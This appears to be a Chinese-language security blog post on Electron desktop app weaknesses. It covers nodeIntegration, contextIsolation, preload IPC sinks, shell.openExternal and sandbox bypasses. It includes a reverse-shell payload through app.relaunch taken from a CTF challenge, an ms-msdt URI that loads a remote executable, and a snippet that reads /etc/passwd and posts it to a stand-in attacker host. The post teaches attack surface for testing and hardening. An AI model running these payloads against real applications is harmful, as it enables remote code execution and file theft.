electron安全简记 
0x01-electron启动 
通常 electron 项⽬的应⽤⼊⼝是 main.js ，也可以 package.json 中配置 npm start 脚本，它
以 package.json 中的 main 属性寻找⼊⼝⽂件
electron .
main.js 的⼤致逻辑就是调⽤ BrowserWindow 启动窗体，在此之前执⾏ preload.js 预加载⼀些
ipc函数接⼝、设置环境变量等
# main.js
const { app, BrowserWindow } = require('electron')
const path = require('path')
function createWindow () {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js')
    }
  })
  win.loadFile('index.html')
}
app.whenReady().then(() => {
  createWindow()
  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow()
    }
  })
})
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit()
  }
})
关于快速启动⼀个electron应⽤可以参考官⽅⼿册的代
码：https://www.electronjs.org/zh/docs/latest/tutorial/quick-start
⽣产环境⼤多⽤ electron-packager 对编写的应⽤进⾏打包，⽣成exe或者其他跨平台的可执⾏程
序
electron-packager . myfirstapp --win --out ./output --arch=x64 --electron-
version=17.0.0 --app-version=1.0.
0x02-electron进程通信 
Electron 应⽤会为每个打开的 BrowserWindow ( 每个⽹⻚嵌⼊ ) ⽣成⼀个单独的渲染器进程，即
不同⻚⾯代表不同的 RenderProcess ，这⼀点应该和 Chromium Site Isolation 处理⼀致。进程
间的通信由 ipc 完成
0x03-安全问题的⼏个讨论 
electron@12之后，需要设置 BrowserWindow  的启动参数如下，才能在渲染进程的  标签
（⻚⾯）中使⽤ JavaScript 调⽤ nodeContextAPI （例如require函数等）
    win = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            //safe configure
            nodeIntegration: false,
            contextIsolation: true,
            preload: path.join(__dirname, 'preload.js'),
            sandbox: true
        }
    });
    win.loadFile("index.html");
1、设置nodeIntegration为false，将禁⽌在渲染进程中获取node原⽣模块，缺省值为false
2、设置sandbox为true，将禁⽌在渲染进程中获取node原⽣模块，缺省值为false
3、设置contextIsolcation为true，将隔离预加载脚本preload.js中定义的api，缺省值为true
综合1、2点，会导致渲染进程⻚⾯的  标签不能加载 require 的情况。 electron@5 之前
默认 contextIsolcation 为 true ， electron@12 以后默认为安全值。 contextIsolation  的主
要⽬的是阻⽌渲染器进程原型链污染到主进程，⽤来隔离变量。与此同时，在使⽤ BrowserView
嵌⼊的⼦⻚⾯，如 iframe 、 Webview 等， webPreferences 取默认值（安全）
nodeIntegrationInWorker带来的问题 
nodeIntegration 有很多⼦选项，⽐如 nodeIntegrationInWorker 和
nodeintegrationinsubframes ，从字⾯意思不难看出是允许 Web Worker 或者 iframe ⼦⻚⾯获
取 NodeContext 。这⾥以 nodeIntegrationInWorker 为例，当 nodeIntegrationInWorker: 
true 时，允许我们在 Web Wokers 中调⽤ Node API 执⾏任意代
码， nodeintegrationinsubframes 同理只需要在⼦⻚⾯的  标签中写恶意代码即可。
⼀个典型的漏洞案例出⾃RocketChat客户端，这⾥抽象出漏洞原理如下两图
漏洞来源：SSD Advisory - Rocket.Chat Client-side Remote Code Execution - SSD Secure
Disclosure
preload.js带来的安全问题 
preload.js 不受 nodeIntegration 限制，这个设计模式的作⽤是定义⼀些全局 window.API 供
render 进程使⽤，⽐如封装node系统模块的调⽤给⽤户层，从⽽规避 nodeIntegration 的限
制。
下⾯这例⼦中通过预加载脚本暴露  ipcRenderer.send ，就可以在任意的 renderProcess 进程中
调⽤此接⼝
那么在 contextIsolation: true 与 nodeIntegration: false 时，攻击者可以寻找预加载脚
本 preload.js 中是否存在 sink ，相当于寻找 ipc 通信过程中的危险操作。类⽐起来，有些像前
端中经典的 postMessage 未验证来源从⽽产⽣的 XSS 攻击。抽象出的漏洞 demo 如下图所示
同样在2022 hack.luCTF中也有相同的例⼦， nodeIntegration: false ，在 preload.js 使
⽤ window.api 接⼝暴露 RendererApi ，其中 RendererApi#invoke 函数调⽤ ipcRenderer 进
⾏ renderProcess 与主进程 renderMain 之间IPC通信
//preload.js
const {ipcRenderer, contextBridge} = require('electron')
const RendererApi = {
  invoke: (action, ...args)  => {
      return ipcRenderer.send("RELaction",action, args);
  },
};
// SECURITY: expose a limted API to the renderer over the context bridge
// https://github.com/1password/electron-secure-defaults/SECURITY.md#rule-3
contextBridge.exposeInMainWorld("api", RendererApi);
主进程 renderMain 定义了 RELaction  事件的处理⽅法，这⾥存在⽣命周期对象 app 的任意函数
调⽤，因 app 对象重载时可以指定⽂件路径与参数，相当于任意命令执⾏
app.relaunch({execPath: 'bash', args: ['-c', 'bash -i >& /dev/tcp/HOST/PORT 
0>&1']})
对于这道题⽬来说，在任意的 render ⻚⾯中存在XSS就能调⽤ window.api.invoke('relaunch',
{execPath: 'bash', args: ['-c', 'xxx']})  实现RCE
contextIsolation带来的安全问题 
当 contextIsolation: false 时，当前⻚⾯的渲染进程 renderProcess 可以获取到主进程预加载
时注⼊的window变量，如果开发者图省事在 window 对象上宏定义 ipcRender 接⼝⽅法，渲染进
程就能借助于 window.IpcMethod 向 ipcMain 监听的事件发送信号，或者直接调⽤宏定义⽅法等
另外，笔者简单验证了下其是否可以通过渲染进程的变量影响到其他进程/主进程变量。
⾸先假设我们有两个⻚⾯A.html、B.html。在A⻚⾯渲染进程renderProcessA中篡改window.myAPI
后，调⽤window.location.href跳转到B⻚⾯渲染进程renderProcessB，此时window.myAPI仍是预
加载时主进程所定义的值。⽽通过location再次跳回A⻚⾯后，window.myAPI为我们篡改的值。
这反映出两个问题：1、渲染进程可以更改window.myAPI，但是⽆法覆盖其他渲染进程或者主进程
的window.myAPI，因为这不是⼀个双向共享的概念。2、electron在⻚⾯跳转后并没有回收渲染进
程renderProcess，当再次打开⻚⾯时进程变量依然存在，这可能跟chromium实现/回收
renderProcess的机制有关，有待进⼀步发掘有趣的环节
shell.openExternal带来的安全问题 
若 shell.openExternal 存在可控参数也可被视为 sink 。 shell.openExternal 本身设计⽤来打
开外部应⽤的，例如使⽤浏览器打开某个⽹⻚。如果 openExternal 的参数没有限制
为 http/https ，将可以⽤ smb 或者其他⽂件协议打开远程地址的exe⽂件，存在RCE的⻛险
对于 Windows 来说，还有其他协议能够伪装exe的执⾏，例如 ms-msdt 协议通过诱导⽤户点击修复
系统，从⽽远程加载exe⽂件
ms-msdt:-id PCWDiagnostic /moreoptions false /skip true /param 
IT_BrowseForFile="\\live.sysinternals.com\tools\procmon.exe" /param 
IT_SelectProgram="NotListed" /param IT_AutoTroubleshoot="ts_AUTO"
更多的利⽤可以参考：The dangers of Electron's shell.openExternal()-many paths to remote code
execution
chromeV8 render漏洞带来的安全问题 
chromeV8 render漏洞可以将nodeIntegration和contextIsolation进⾏开启与关闭
常⽤的攻击⼿段：关闭contextIsolation后进⾏IPC leak；开启nodeIntegrationInSubFrames进
⾏，填充iframe srcdoc 包含恶意的系统调⽤语句；这个对 electron 有版本限制及较强的原型链
劫持限制，暂时不做讨论
0x04-⼩技巧 
打开控制台 
在创建BrowserWindow对象后，调⽤openDevTools()⽅法
或者在打开 electron app 后，按 CTRL+Shift+I 打开 devtools 。对某些商业应⽤的反调试，可
以借助字节的⼯具开启 debuger ：https://github.com/bytedance/debugtron
设置http代理⾛burpsuite 
可以在启动 electron app 时指定http代理并忽略证书，让 electron 内http/s流量
⾛ burpsuite ，只需要在app对象调⽤electron封装的 chromium Native ⽅法
commandLine.appendArgument(value)
appendSwitch 这⼀⽅法相当于在 Chromium 启动时添加参数，也是⽐较巧妙的
0x05-绕过 
绕过nodeIntegration 
默认 nodeIntegration 为 false ，历史上出现过两个绕过的案例： CVE-2018-15685 、 CVE-
2018-1000136 ；这两个都是在 nodeIntegration 实现机制产⽣的漏洞
即使 BrowserWindow 设置 nodeIntegration 为 true ，也不能辐射到它的⼦⻚⾯；如下图所示，
当 BrowserWindow ⻚⾯中通过 iframe 加载得到⼦⻚⾯ Webview 会隔绝 node 环境，和 iframe 在
DOM的实现机制差不多，都处在 sandbox
这意味着即使⼦⻚⾯存在XSS，也不能调⽤node上下⽂执⾏内构函数（require等）。但历史漏
洞VsCode RCE 这篇⽂章⾥讲到了⼀个利⽤⾯如下
众所周知 ChromeDom 的世界观⾥，倘若 iframe 创建⼦⻚⾯时指定了 sandbox 属性，那么在没有
指定 allow-same-origin 时⼦⻚⾯会被浏览器认为是⾮同源。
⽽当创建 iframe 时 sandbox 属性指定参数 allow-scripts、allow-same-origin ，⼦⻚⾯就可以
获取⽗⻚⾯的变量及属性。由于在⽂章的例⼦存在这样的情况，⼦⻚⾯可以引⽤ top.require 进
⾏RCE
其他常规操作 
由于 electron ⽀持的uri协议有file，还可以通过 Web API 读⽂件外带，不违背同源策略
var xhr = new XMLHttpRequest();
xhr.open("GET", "file:///etc/passwd", true);
xhr.onload = () => {
   fetch("http://eveil.hack/",{method:"POST", body:xhr.responseText});
};
xhr.send( null );
0x06-写在最后 
安利⼀篇BH2022的⼀篇议题：ElectroVolt